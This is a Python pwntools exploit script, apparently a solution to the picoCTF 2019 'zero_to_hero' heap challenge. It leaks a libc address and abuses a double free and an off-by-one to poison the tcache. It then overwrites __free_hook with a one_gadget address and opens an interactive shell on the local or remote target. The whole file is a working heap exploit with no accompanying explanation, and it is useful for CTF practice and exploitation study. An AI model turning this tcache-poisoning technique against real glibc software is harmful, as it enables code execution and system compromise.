from pwn import *
from struct import pack
import sys


# Double free vulnerability
# Of-by-one vulnerability


# Constants
SLOTS_ADDR = 0x00602060
SYSTEM_OFFSET = 0x52fd0
FREE_HOOK_OFFSET = 0x1e75a8


def welcome(answer):
    p.recvuntil(b'From Zero to Hero\nSo, you want to be a hero?')
    p.sendline(answer)
    p.recvuntil(b'Really? Being a hero is hard.\nFine. I see I can\'t convince you otherwise.\nIt\'s dangerous to go alone. Take this: ')
    system_addr = int(p.recvuntil(b'\n')[:-1], 16)
    log.info("System address: " + hex(system_addr))
    
    libc_base = system_addr - SYSTEM_OFFSET
    log.info("Libc base address: " + hex(libc_base))
    return libc_base


def alloc_slot(size, content):
    p.sendline(b'1')

    p.recvuntil(b'Describe your new power.\nWhat is the length of your description?\n> ')
    p.sendline(str(size).encode('utf-8'))

    p.recvuntil(b'Enter your description: \n> ')
    p.send(content)

    p.recvuntil('Done!\n')


def free_slot(idx):
    p.sendline(b'2')
    p.recvuntil(b'Which power would you like to remove?\n> ')
    p.sendline(str(idx).encode('utf-8'))


def exit_game():
    p.sendline(b'3')
    p.recvuntil(b'Giving up?\n')




if len(sys.argv) == 2 and sys.argv[1] == 'remote':
    p = remote('2019shell1.picoctf.com', 49928)
else:
    p = process('./zero_to_hero')
    context.log_level = 'debug'

if len(sys.argv) == 2 and sys.argv[1] == 'debug':
    gdb.attach(p)
    raw_input(b'Continue and press enter to send payload...')


libc_base = welcome(b'yes!')


alloc_slot(0x140 - 8, b'A' * (0x140 - 8 - 1)) # slot 0, chunk 0
alloc_slot(0x140 - 8, b'B' * (0x140 - 8 - 1)) # slot 1, chunk 1

free_slot(1)
free_slot(0)

alloc_slot(0x140 - 8, b'A' * (0x140 - 8)) # slot 3, chunk 0
free_slot(1)

# Bins:
# TC 0x140 -----> chunk 1
# TC 0x100 -----> chunk 1
# Let's poison 0x100 tcache list by overwriting fd pointer of new slot with &__free_hook address
free_hook_addr = libc_base + FREE_HOOK_OFFSET
alloc_slot(0x140 - 8, p64(free_hook_addr)) # slot 4, chunk 1

# Bins:
# TC 0x100 -----> chunk 1 -------> &__free_hook
alloc_slot(0x100 - 8, p64(free_hook_addr)) # slot 5, chunk 1

# Bins:
# TC 0x100 -----> &__free_hook
one_gadget_addr = libc_base + 0xe2383
alloc_slot(0x100 - 8, p64(one_gadget_addr))

free_slot(0)

p.interactive()